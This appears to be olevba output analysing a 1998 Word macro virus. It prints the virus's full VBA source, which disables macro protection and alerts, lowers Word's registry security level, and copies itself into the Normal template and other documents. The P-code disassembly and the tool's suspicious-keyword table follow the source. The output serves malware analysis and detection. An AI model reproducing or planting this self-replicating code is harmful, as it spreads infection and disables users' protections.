olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shadow
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shadow - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Shadow
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = (0)
Options.SaveNormalPrompt = (0)
Application.DisplayAlerts = (0)
Application.ScreenUpdating = (0)
Application.EnableCancelKey = (0)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
γ = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "SystemRoot") & ".\TEMP\"
Do While FileLen(γ & System.ProfileString("", "DefaultFileName")) = 0
Randomize: α = "~WR00000.TMP"
Mid(α, 4, 1) = Chr(Int((26 * Rnd) + 65))
Mid(α, 8, 1) = Int(Rnd() * 10)
VBProject.VBComponents(1).Export (γ & α)
Open γ & α For Input As #1
For η = 1 To 4: Line Input #1, �: Next: η = ""
Do Until ι = "'�"
Line Input #1, ι
η = η & ι & Chr(13) & Chr(10)
Loop: Close #1
Open γ & α For Output As #1: Print #1, η: Close #1
System.ProfileString("", "DefaultFileName") = α: Loop
Set α = IIf(MacroContainer <> NormalTemplate, NormalTemplate, ActiveDocument).VBProject.VBComponents(1)
If α.CodeModule.CountOfLines > 0 Or ActiveDocument.Path = "" Then Exit Sub
α.CodeModule.AddFromFile γ & System.ProfileString("", "DefaultFileName")
α.CodeModule.Replaceline 2, "Private Sub " & IIf(MacroContainer <> NormalTemplate, "Document_Open()", "Document_Close()")
End Sub
'�

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Shadow
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3547 bytes
' Line #0:
' 	QuoteRem 0x0000 0x002D "Copyright (C) 1998 by FlyShadow ~^^~ - Shadow"
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitDI2 0x0000 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitDI2 0x0000 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitDI2 0x0000 
' 	Paren 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #6:
' 	LitDI2 0x0000 
' 	Paren 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #7:
' 	LitDI2 0x0000 
' 	Paren 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #8:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #9:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0007 ".\TEMP\"
' 	Concat 
' 	St γ 
' Line #10:
' 	Ld γ 
' 	LitStr 0x0000 ""
' 	LitStr 0x000F "DefaultFileName"
' 	Ld System 
' 	ArgsMemLd ProfileString 0x0002 
' 	Concat 
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	DoWhile 
' Line #11:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x000C "~WR00000.TMP"
' 	St α 
' Line #12:
' 	LitDI2 0x001A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Ld α 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Mid 
' Line #13:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	Ld α 
' 	LitDI2 0x0008 
' 	LitDI2 0x0001 
' 	Mid 
' Line #14:
' 	Ld γ 
' 	Ld α 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #15:
' 	Ld γ 
' 	Ld α 
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #16:
' 	StartForVariable 
' 	Ld η 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld � 
' 	LineInput 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St η 
' Line #17:
' 	Ld ι 
' 	LitStr 0x0002 "'�"
' 	Eq 
' 	DoUnitil 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld ι 
' 	LineInput 
' Line #19:
' 	Ld η 
' 	Ld ι 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St η 
' Line #20:
' 	Loop 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #21:
' 	Ld γ 
' 	Ld α 
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld η 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #22:
' 	Ld α 
' 	LitStr 0x0000 ""
' 	LitStr 0x000F "DefaultFileName"
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' 	BoS 0x0000 
' 	Loop 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Ne 
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	ArgsLd IIf 0x0003 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set α 
' Line #24:
' 	Ld α 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #25:
' 	Ld γ 
' 	LitStr 0x0000 ""
' 	LitStr 0x000F "DefaultFileName"
' 	Ld System 
' 	ArgsMemLd ProfileString 0x0002 
' 	Concat 
' 	Ld α 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #26:
' 	LitDI2 0x0002 
' 	LitStr 0x000C "Private Sub "
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Ne 
' 	LitStr 0x000F "Document_Open()"
' 	LitStr 0x0010 "Document_Close()"
' 	ArgsLd IIf 0x0003 
' 	Concat 
' 	Ld α 
' 	MemLd CodeModule 
' 	ArgsMemCall Replaceline 0x0002 
' Line #27:
' 	EndSub 
' Line #28:
' 	QuoteRem 0x0000 0x0001 "�"
' Line #29:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

